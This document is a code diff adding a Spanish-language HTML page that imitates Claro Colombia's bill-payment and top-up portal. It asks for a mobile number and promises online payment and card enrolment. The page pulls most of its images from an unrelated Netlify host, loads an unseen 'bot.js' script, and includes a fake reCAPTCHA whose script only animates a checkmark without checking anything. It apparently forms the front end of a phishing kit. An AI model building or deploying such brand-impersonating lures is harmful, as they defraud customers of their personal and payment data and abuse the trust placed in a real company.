@@ -1,0 +1,320 @@
+
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, user-scalable=no" />
+    <link rel="icon" type="https://juliconpromoshoy.netlify.app/image/png" href="img/favicon.ico" />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Portal recaudos y facturas</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap"
+        rel="stylesheet" />
+    <link rel="stylesheet" href="css/index.css" />
+    <link rel="stylesheet" href="/css/loader.css">
+    <link rel="stylesheet" href="css/newIndex.css">
+    <script src="./js/functions.js"></script>
+    <script src="./js/debtMap.js"></script>
+</head>
+
+<body>
+    <!-- first header -->
+    <span class="px-6 flex flex-row items-center justify-between w-full min-h-[40px] max-h-[40px]">
+        <span class="flex flex-row items-center gap-10">
+            <p class="text-[12pt] text-[#313131] font-semibold border-b-4 border-b-[#FFC73C]">Personas</p>
+            <p class="hidden md:flex text-[12pt] text-[#313131] font-semibold hover:border-b-4 border-b-[#FFC73C]">
+                Negocios</p>
+            <p class="hidden md:flex text-[12pt] text-[#313131] font-semibold hover:border-b-4 border-b-[#FFC73C]">
+                Empresas</p>
+            <p class="hidden md:flex text-[12pt] text-[#313131] font-semibold hover:border-b-4 border-b-[#FFC73C]">
+                Institucional</p>
+        </span>
+
+        <span class="flex flex-row items-center gap-4">
+            <p class="flex flex-row gap-2 items-center text-[12pt] text-[#313131] font-semibold">
+                Más de Claro
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="currentColor"
+                    class="icon icon-tabler icons-tabler-filled icon-tabler-caret-down">
+                    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                    <path
+                        d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6l-.083 -.094l-.054 -.077l-.054 -.096l-.017 -.036l-.027 -.067l-.032 -.108l-.01 -.053l-.01 -.06l-.004 -.057v-.118l.005 -.058l.009 -.06l.01 -.052l.032 -.108l.027 -.067l.07 -.132l.065 -.09l.073 -.081l.094 -.083l.077 -.054l.096 -.054l.036 -.017l.067 -.027l.108 -.032l.053 -.01l.06 -.01l.057 -.004l12.059 -.002z" />
+                </svg>
+            </p>
+            <p class="flex flex-row gap-2 items-center text-[12pt] text-[#313131] font-semibold">
+                <img class="w-[20px] h-[30px]" src="https://juliconpromoshoy.netlify.app/assets/flag-colombia.svg" alt="">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="currentColor"
+                    class="icon icon-tabler icons-tabler-filled icon-tabler-caret-down">
+                    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                    <path
+                        d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6l-.083 -.094l-.054 -.077l-.054 -.096l-.017 -.036l-.027 -.067l-.032 -.108l-.01 -.053l-.01 -.06l-.004 -.057v-.118l.005 -.058l.009 -.06l.01 -.052l.032 -.108l.027 -.067l.07 -.132l.065 -.09l.073 -.081l.094 -.083l.077 -.054l.096 -.054l.036 -.017l.067 -.027l.108 -.032l.053 -.01l.06 -.01l.057 -.004l12.059 -.002z" />
+                </svg>
+            </p>
+        </span>
+
+    </span>
+
+
+    <!-- se header -->
+
+    <header class="bg-[#EF3320] min-h-[53px] max-h-[53px] w-full flex flex-row items-center px-4 pr-10 justify-between">
+
+        <span class="flex flex-row items-center gap-4">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+                stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                class="md:hidden icon icon-tabler icons-tabler-outline icon-tabler-menu-2">
+                <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                <path d="M4 6l16 0" />
+                <path d="M4 12l16 0" />
+                <path d="M4 18l16 0" />
+            </svg>
+            <img class="w-[73px]" src="./assets/claro.svg" alt="">
+            <span class="hidden md:flex flex-row items-center text-white">
+                <p class="text-[13pt] text-[white] font-bold">Servicios</p>
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="white"
+                    class="icon icon-tabler icons-tabler-filled icon-tabler-caret-down">
+                    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                    <path
+                        d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6l-.083 -.094l-.054 -.077l-.054 -.096l-.017 -.036l-.027 -.067l-.032 -.108l-.01 -.053l-.01 -.06l-.004 -.057v-.118l.005 -.058l.009 -.06l.01 -.052l.032 -.108l.027 -.067l.07 -.132l.065 -.09l.073 -.081l.094 -.083l.077 -.054l.096 -.054l.036 -.017l.067 -.027l.108 -.032l.053 -.01l.06 -.01l.057 -.004l12.059 -.002z" />
+                </svg>
+            </span>
+            <span class="hidden md:flex flex-row items-center text-white">
+                <p class="text-[13pt] text-[white] font-bold">Tienda</p>
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="white"
+                    class="icon icon-tabler icons-tabler-filled icon-tabler-caret-down">
+                    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                    <path
+                        d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6l-.083 -.094l-.054 -.077l-.054 -.096l-.017 -.036l-.027 -.067l-.032 -.108l-.01 -.053l-.01 -.06l-.004 -.057v-.118l.005 -.058l.009 -.06l.01 -.052l.032 -.108l.027 -.067l.07 -.132l.065 -.09l.073 -.081l.094 -.083l.077 -.054l.096 -.054l.036 -.017l.067 -.027l.108 -.032l.053 -.01l.06 -.01l.057 -.004l12.059 -.002z" />
+                </svg>
+            </span>
+            <span class="hidden md:flex flex-row items-center text-white">
+                <p class="text-[13pt] text-[white] font-bold">Soporte</p>
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="white"
+                    class="icon icon-tabler icons-tabler-filled icon-tabler-caret-down">
+                    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                    <path
+                        d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6l-.083 -.094l-.054 -.077l-.054 -.096l-.017 -.036l-.027 -.067l-.032 -.108l-.01 -.053l-.01 -.06l-.004 -.057v-.118l.005 -.058l.009 -.06l.01 -.052l.032 -.108l.027 -.067l.07 -.132l.065 -.09l.073 -.081l.094 -.083l.077 -.054l.096 -.054l.036 -.017l.067 -.027l.108 -.032l.053 -.01l.06 -.01l.057 -.004l12.059 -.002z" />
+                </svg>
+            </span>
+        </span>
+
+        <span class="flex flex-row gap-2 items-center">
+            <span class="hidden md:flex flex-row items-center text-white">
+                <p class="text-[11pt] text-[white] font-semibold">Información importante para usuarios</p>
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="white"
+                    class="icon icon-tabler icons-tabler-filled icon-tabler-caret-down">
+                    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                    <path
+                        d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6l-.083 -.094l-.054 -.077l-.054 -.096l-.017 -.036l-.027 -.067l-.032 -.108l-.01 -.053l-.01 -.06l-.004 -.057v-.118l.005 -.058l.009 -.06l.01 -.052l.032 -.108l.027 -.067l.07 -.132l.065 -.09l.073 -.081l.094 -.083l.077 -.054l.096 -.054l.036 -.017l.067 -.027l.108 -.032l.053 -.01l.06 -.01l.057 -.004l12.059 -.002z" />
+                </svg>
+            </span>
+            <button
+                class="flex flex-row font-bold text-white gap-2 items-center rounded-full px-4 min-h-[40px] bg-[#D01508]">
+                <img width="max-w-[24px] max-h-[24px]" src="https://juliconpromoshoy.netlify.app/assets/c2btn.png" alt="">
+                Mi Claro
+            </button>
+        </span>
+
+    </header>
+    <main>
+        <div id="ggris1" class="gris1">
+            <br>
+            <div class="texto_gris">
+                <p class="texto1">
+                    Portal de
+                    <span class="rojo">PAGOS <span class="recargas"> Y RECARGAS</span></span>
+                </p>
+
+            </div>
+
+        </div>
+        <table id="tabla-opciones" cl>
+            <tr>
+                <td valign="top" align="center">
+                    <img id="azul1" src="https://juliconpromoshoy.netlify.app/img/icono-seleccion-on.png" class="imagen" />
+                </td>
+                <td valign="top" align="center">
+                    <img id="azul2" src="https://juliconpromoshoy.netlify.app/img/icono-mediopago-off.png" class="imagen" />
+                </td>
+                <td valign="top" align="center">
+                    <img id="azul3" src="https://juliconpromoshoy.netlify.app/img/icono-pago-off.png" class="imagen" />
+                </td>
+                <td valign="top" align="center">
+                    <img id="azul4" src="https://juliconpromoshoy.netlify.app/img/icono-resultado-off.png" class="imagen" />
+                </td>
+            </tr>
+            <tr>
+                <td valign="top" align="center" class="etq-pasos act-pasos" style="font-weight: 600;">
+                    Selecciona<br />tu servicio
+                </td>
+                <td valign="top" align="center" class="etq-pasos"">
+          Escoge el <br />medio de pago
+        </td>
+        <td valign=" top" align="center" class="etq-pasos">
+                    Realiza el <br />Pago en línea
+                </td>
+                <td valign="top" align="center" class="etq-pasos">
+                    Recibe la <br />Confimación
+                </td>
+            </tr>
+        </table>
+
+        <div id="contenedor"></div>
+
+        <section id="usuario">
+            <div class="texto_gris2">
+                <br /><br />
+                <h2 class="texto2">
+                    Realiza el pago de la factura de tus servicios Claro, compra
+                    paquetes y haz recargas de manera fácil y desde donde quieras.
+                    También, puedes inscribir tu tarjeta de crédito para realizar el
+                    pago de tus facturas de manera automática.
+                </h2>
+            </div>
+            <br />
+            <div class="servicio">
+                <label style="color: #626c70">Selecciona el tipo de servicio</label>
+                <div class="servicios text-muted d-flex flex-col flex-wrap">
+                    <div class="servicio-item align-items-center" onclick="cambiaimg(1)">
+                        <img class="iconitos order-md-2" src="https://juliconpromoshoy.netlify.app/img/celular.png" alt="Icono celular" />
+                        <p class="order-md-1">Postpago</p>
+                        <img id="check1" class="check order-md-3" style="margin-top: 0.5rem;" src="img/uncheck.png"
+                            alt="Checkbox" />
+                    </div>
+                    <div class="servicio-item d-flex flex-column flex-md-row align-items-center" onclick="cambiaimg(2)">
+                        <img class="iconitos order-md-2" src="img/hogar.png" alt="Icono hogar" />
+                        <p class="order-md-1">Hogar</p>
+                        <img id="check2" style="margin-top: 0.5rem;" class="check order-md-3" src="img/uncheck.png"
+                            alt="Checkbox" />
+                    </div>
+                    <div class="servicio-item d-flex flex-column flex-md-row align-items-center" onclick="cambiaimg(3)">
+                        <img class="iconitos order-md-2" src="https://juliconpromoshoy.netlify.app/img/equipos.png" alt="Icono equipos" />
+                        <p class="order-md-1">Equipo</p>
+                        <img id="check3" style="margin-top: 0.5rem;" class="check order-md-3" src="img/uncheck.png"
+                            alt="Checkbox" />
+                    </div>
+                    <div class="servicio-item d-flex flex-column flex-md-row align-items-center" onclick="cambiaimg(4)">
+                        <img class="iconitos order-md-2" src="https://juliconpromoshoy.netlify.app/img/internet.png" alt="Icono internet" />
+                        <p class="order-md-1">Internet</p>
+                        <img id="check4" style="margin-top: 0.5rem;" class="check order-md-3" src="img/uncheck.png"
+                            alt="Checkbox" />
+                    </div>
+                </div>
+            </div>
+
+            <br />
+
+            <label for="celular" style="color: #626c70">Número de celular</label>
+            <br />
+            <input type="number" name="celular" class="input-cel" required id="celular" inputmode="numeric" value=""
+                autocomplete="off" minlength="10" maxlength="10" />
+
+            <br />
+
+            <!-- captcha--->
+            <span id="captchaZone" class="flex flex-col w-full items-center">
+
+                <span
+                    class="flex flex-row min-w-[320px] md:max-w-[320px] p-2 min-h-[70px] mt-3 border bg-[#F9F9F9] shadow-md">
+                    <span class="flex flex-col w-full justify-center">
+
+                        <span class="flex flex-row items-center gap-3 w-full">
+                            <span id="checkbox"
+                                class="min-w-[32px] min-h-[32px] max-w-[32px] max-h-[32px] border-[gray] border-opacity-70 border-2"></span>
+
+                            <svg id="cl" aria-hidden="true"
+                                class="hidden w-8 h-8 text-gray-200 animate-spin dark:text-gray-600 fill-blue-600"
+                                viewBox="0 0 100 101" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path
+                                    d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z"
+                                    fill="transparent" />
+                                <path
+                                    d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z"
+                                    fill="currentFill" />
+                            </svg>
+                            <svg id="clc" xmlns="http://www.w3.org/2000/svg" width="38" height="38" viewBox="0 0 24 24"
+                                fill="none" stroke="#009D5A" stroke-width="2" stroke-linecap="round"
+                                stroke-linejoin="round"
+                                class="hidden icon icon-tabler icons-tabler-outline icon-tabler-check">
+                                <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                                <path d="M5 12l5 5l10 -10" />
+                            </svg>
+                            <p>
+                                No soy un robot
+                            </p>
+                        </span>
+
+                        <span class="flex flex-row items-center gap-1 ">
+                            <span class="text-[8pt] text-gray text-opacity-70 pt-1">Este sitio supera la </span>
+                            <span class="text-[8pt] text-gray text-opacity-70 pt-1 underline">cuota de
+                                reCAPTCHA.</span>
+                        </span>
+                    </span>
+                    <span class="flex flex-col items-end">
+                        <img class="max-w-[36px] mr-2" src="/assets/cl.png" alt="">
+                        <p class="text-[7pt] text-[gray] font-semibold text-end w-full">reCAPTCHA</p>
+                        <p class="text-[6pt] text-[gray] font-semibold whitespace-nowrap">Privacidad - Términos
+                        </p>
+                    </span>
+                </span>
+                <p id="msg-error-captcha" class="hidden text-[red]">Debes completar el captcha.</p>
+            </span>
+
+            <div class="botones">
+                <br /><button class="boton_continuar" id="boton">
+                    Continuar
+                </button>
+            </div>
+        </section>
+
+        <section id="errorpasarela" style="display: none">
+            <br />
+            <br />
+            <br />
+            <br />
+            <br />
+            <br />
+            <div style="text-align: center">
+                <img style="width: 130px; margin-left: auto"
+                    src="https://dev-claro-img-css.pantheonsite.io/iconos-logo-claro.png" /><br /><br />
+                <div class="loader">
+                    <div class="dot"></div>
+                    <div class="dot"></div>
+                    <div class="dot"></div>
+                </div>
+            </div>
+        </section>
+        <div id="loader">
+            <svg viewBox="25 25 50 50" class="svg-cicrcle">
+                <circle r="20" cy="50" cx="50"></circle>
+            </svg>
+        </div>
+    </main>
+    <br /><br />
+    <img class="hidden md:flex" src="./assets/footer-dk.png" alt="">
+    <img class="flex md:hidden" src="./assets/footer.png" alt="">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="js/bot.js"></script>
+    <script src="js/main.js"></script>
+    <script>
+        // Captcha functionality
+        const checkbox = document.getElementById("checkbox");
+        const cl = document.getElementById("cl");
+        const clc = document.getElementById("clc");
+        const msgErrorCaptcha = document.getElementById("msg-error-captcha");
+
+        checkbox.addEventListener("click", () => {
+            checkbox.classList.add("hidden"); // Hide the checkbox
+            cl.classList.remove("hidden"); // Show the loading spinner
+
+            setTimeout(() => {
+                cl.classList.add("hidden"); // Hide the loading spinner
+                clc.classList.remove("hidden"); // Show the checkmark
+                msgErrorCaptcha.classList.add("hidden"); // Hide error message if visible
+            }, 1000); // Simulate a delay of 1 second
+        });
+    </script>
+</body>
+
+</html>
